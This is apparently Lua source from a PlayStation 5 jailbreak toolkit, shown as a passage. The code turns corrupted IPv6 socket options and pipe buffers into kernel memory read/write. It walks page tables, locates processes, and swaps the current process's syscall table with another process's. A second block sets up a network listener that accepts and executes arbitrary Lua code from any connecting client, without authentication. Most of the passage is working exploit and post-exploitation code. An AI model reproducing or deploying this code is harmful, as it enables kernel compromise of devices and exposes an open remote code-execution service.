    memory.write_qword(pktinfo_size_store, 0x14)

    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()

    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)

    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)

    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)

    -- magic
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
end

function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
end

function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
end

function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
end

function ipv6_kernel_rw.ipv6_kread8(kaddr)
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
end

function ipv6_kernel_rw.copyout(kaddr, uaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    
    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
end

function ipv6_kernel_rw.copyin(uaddr, kaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)

    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
end

function ipv6_kernel_rw.read_buffer(kaddr, len)

    local mem = ipv6_kernel_rw.data.read_mem
    if len > PAGE_SIZE then
        mem = memory.alloc(len)
    end

    ipv6_kernel_rw.copyout(kaddr, mem, len)
    return memory.read_buffer(mem, len)
end

function ipv6_kernel_rw.write_buffer(kaddr, buf)
    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
end





-- cpu page table

CPU_PDE_SHIFT = {
    PRESENT = 0,
    RW = 1,
    USER = 2,
    WRITE_THROUGH = 3,
    CACHE_DISABLE = 4,
    ACCESSED = 5,
    DIRTY = 6,
    PS = 7,
    GLOBAL = 8,
    XOTEXT = 58,
    PROTECTION_KEY = 59,
    EXECUTE_DISABLE = 63
}

CPU_PDE_MASKS = {
    PRESENT = 1,
    RW = 1,
    USER = 1,
    WRITE_THROUGH = 1,
    CACHE_DISABLE = 1,
    ACCESSED = 1,
    DIRTY = 1,
    PS = 1,
    GLOBAL = 1,
    XOTEXT = 1,
    PROTECTION_KEY = 0xf,
    EXECUTE_DISABLE = 1
}

CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")

function cpu_pde_field(pde, field)
    local shift = CPU_PDE_SHIFT[field]
    local mask = CPU_PDE_MASKS[field]
    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
end

function cpu_walk_pt(cr3, vaddr)

    assert(vaddr, cr3)

    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)

    -- pml4

    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then
        return nil
    end

    -- pdp

    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
    local pdpe = kernel.read_qword(pdpe_va)

    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then
        return nil
    end

    -- pd

    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
    local pde = kernel.read_qword(pde_va)

    if cpu_pde_field(pde, "PRESENT") ~= 1 then
        return nil
    end

    -- large page
    if cpu_pde_field(pde, "PS") == 1 then
        return bit64.bor(
            bit64.band(pde, CPU_PG_PS_FRAME),
            bit64.band(vaddr, 0x1fffff)
        )
    end

    -- pt

    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
    local pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
    local pte = kernel.read_qword(pte_va)

    if cpu_pde_field(pte, "PRESENT") ~= 1 then
        return nil
    end

    return bit64.bor(
        bit64.band(pte, CPU_PG_PHYS_FRAME),
        bit64.band(vaddr, 0x3fff)
    )
end





-- setup kernel r/w for the loader
function initialize_kernel_rw()

    local state = storage.get("kernel_rw")
    if state then

        -- copy ipv6 states given by the exploit
        ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
        
        -- copy existing resolved addresses from exploit
        kernel.addr = state.kernel_addr
        
        -- enable kernel r/w through ipv6 + pipe
        kernel.copyout = ipv6_kernel_rw.copyout
        kernel.copyin = ipv6_kernel_rw.copyin
        kernel.read_buffer = ipv6_kernel_rw.read_buffer
        kernel.write_buffer = ipv6_kernel_rw.write_buffer

        kernel.rw_initialized = true

        update_kernel_offsets()
    end
end


function is_kernel_rw_available()
    return kernel.read_buffer and kernel.write_buffer
end

function check_kernel_rw()
    if not is_kernel_rw_available() then
        error("kernel r/w is not available")
    end
end


-- useful functions

function find_proc_by_name(name)

    check_kernel_rw()
    assert(kernel.addr.allproc)

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
        if proc_name == name then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function find_proc_by_pid(pid)

    check_kernel_rw()
    assert(kernel.addr.allproc)

    assert(type(pid) == "number")

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
        if proc_pid == pid then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function get_proc_cr3(proc)
    
    check_kernel_rw()
    
    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
end

-- translate virtual address to physical address
-- note: use kernel page table if cr3 is not given
function virt_to_phys(virt_addr, cr3)
    
    check_kernel_rw()
    assert(kernel.addr.dmap_base and virt_addr)
    
    cr3 = cr3 or kernel.addr.kernel_cr3
    return cpu_walk_pt(cr3, virt_addr)
end


function phys_to_dmap(phys_addr)
    assert(kernel.addr.dmap_base and phys_addr)
    return kernel.addr.dmap_base + phys_addr
end


-- replace curproc sysent with sysent of other ps5 process
-- note: failure to restore curproc sysent will have side effect on the game/ps
function run_with_ps5_syscall_enabled(f)

    check_kernel_rw()

    local target_proc_name = "SceGameLiveStreaming" -- arbitrarily chosen ps5 process

    local target_proc = find_proc_by_name(target_proc_name) 
    if not target_proc then
        errorf("failed to find proc addr of %s", target_proc_name)
    end

    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)

    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
    local target_table_size = kernel.read_dword(target_sysent)

    local cur_table = kernel.read_qword(cur_sysent + 0x8) -- sv_table
    local target_table = kernel.read_qword(target_sysent + 0x8)

    -- replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size)
    kernel.write_qword(cur_sysent + 0x8, target_table)

    -- catch lua error so we can restore sysent
    local err = run_with_coroutine(f)
    if err then
        print(err)
    end
    
    -- restore back
    kernel.write_dword(cur_sysent, cur_table_size)
    kernel.write_qword(cur_sysent + 0x8, cur_table) 
end
```

```
function print(...)

        syscall.write(client_fd, out, #out) -- print to socket

function run_lua_code(lua_code)

    assert(client_fd)

    local script, err = loadstring(lua_code)
    if err then
        local err_msg = "error loading script: " .. err
        syscall.write(client_fd, err_msg, #err_msg)
        return
    end

    local env = {
        print = function(...)
            local out = prepare_arguments(...) .. "\n"
            syscall.write(client_fd, out, #out)
        end,
        printf = function(fmt, ...)
            local out = string.format(fmt, ...) .. "\n"
            syscall.write(client_fd, out, #out)
        end
    }

    setmetatable(env, { __index = _G })
    setfenv(script, env)

    err = run_with_coroutine(script)

    -- pass error to client
    if err then
        syscall.write(client_fd, err, #err)
    end
end

function remote_lua_loader(port)

    assert(port)

    local enable = memory.alloc(4)
    local sockaddr_in = memory.alloc(16)
    local addrlen = memory.alloc(8)
    local tmp = memory.alloc(8)

    local command_magic = 0xffffffff
    local maxsize = 500 * 1024  -- 500kb
    local buf = memory.alloc(maxsize)

    local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sock_fd < 0 then
        error("socket() error: " .. get_error_string())
    end

    memory.write_dword(enable, 1)
    if syscall.setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() < 0 then
        error("setsockopt() error: " .. get_error_string())
    end

    local function htons(port)
        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
    end

    memory.write_byte(sockaddr_in + 1, AF_INET)
    memory.write_word(sockaddr_in + 2, htons(port))
    memory.write_dword(sockaddr_in + 4, INADDR_ANY)

    if syscall.bind(sock_fd, sockaddr_in, 16):tonumber() < 0 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(sock_fd, 3):tonumber() < 0 then
        error("listen() error: " .. get_error_string())
    end

    local current_ip = get_current_ip()
    local network_str = nil
    
    if current_ip then
        network_str = string.format("%s:%d", current_ip, port)
    else
        network_str = string.format("port %d", port)
    end
    
    local console_model = get_console_model()

    notify(string.format("remote lua loader\nrunning on %s %s%s\nlistening on %s",
        PLATFORM, console_model, FW_VERSION, network_str))

    while true do

        print("[+] waiting for new connection...")
        
        memory.write_dword(addrlen, 16)

        client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()  
        
        -- need to reinit the socket after rest mode
        while client_fd < 0 do
            print("accept() error: " .. get_error_string())
            
            syscall.close(sock_fd)
            
            sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
            if sock_fd < 0 then
                error("socket() error: " .. get_error_string())
            end

            memory.write_dword(enable, 1)
            if syscall.setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() < 0 then
                error("setsockopt() error: " .. get_error_string())
            end

            memory.write_byte(sockaddr_in + 1, AF_INET)
            memory.write_word(sockaddr_in + 2, htons(port))
            memory.write_dword(sockaddr_in + 4, INADDR_ANY)

            if syscall.bind(sock_fd, sockaddr_in, 16):tonumber() < 0 then
                error("bind() error: " .. get_error_string())
            end
         
            if syscall.listen(sock_fd, 3):tonumber() < 0 then
                error("listen() error: " .. get_error_string())
            end
            
            print("[+] waiting for new connection...")
            
            memory.write_dword(addrlen, 16)

            client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()  
        end
 
        syscall.read(client_fd, tmp, 8)
        local size = memory.read_qword(tmp):tonumber()
        
        -- printf("[+] accepted new connection client fd %d", client_fd)

        if size > 0 and size < maxsize then
            
            local cur_size = size
            local cur_buf = buf
            
            while cur_size > 0 do
                local read_size = syscall.read(client_fd, cur_buf, cur_size):tonumber()
                if read_size < 0 then
                    error("read() error: " .. get_error_string())
                end
                cur_buf = cur_buf + read_size
                cur_size = cur_size - read_size
            end
            
            local lua_code = memory.read_buffer(buf, size)

            -- printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
            
            if options.enable_signal_handler then
                signal.set_sink_fd(client_fd)
            end

            run_lua_code(lua_code)
            syscall.close(client_fd)
            
        elseif size == command_magic then
            local command_tmp = memory.alloc(4)
            syscall.read(client_fd, command_tmp, 1)
            local command = memory.read_dword(command_tmp):tonumber()
            
            if command == 0 then
                signal.clear()
                options.enable_signal_handler = false
                local msg = "command: Disabled signal handler"
                syscall.write(client_fd, msg, #msg)
            elseif command == 1 then
                signal.register()
                options.enable_signal_handler = true
                local msg = "command: Enabled signal handler"
                syscall.write(client_fd, msg, #msg)
            else
                local err = string.format("error: invalid command %d\n", command)
                syscall.write(client_fd, err, #err)
            end
            
            syscall.close(client_fd)
        else
            local err = string.format("error: lua code exceed maxsize " ..
                "(given %s maxsize %s)\n", hex(size), hex(maxsize))
            syscall.write(client_fd, err, #err)
            syscall.close(client_fd)
        end
```
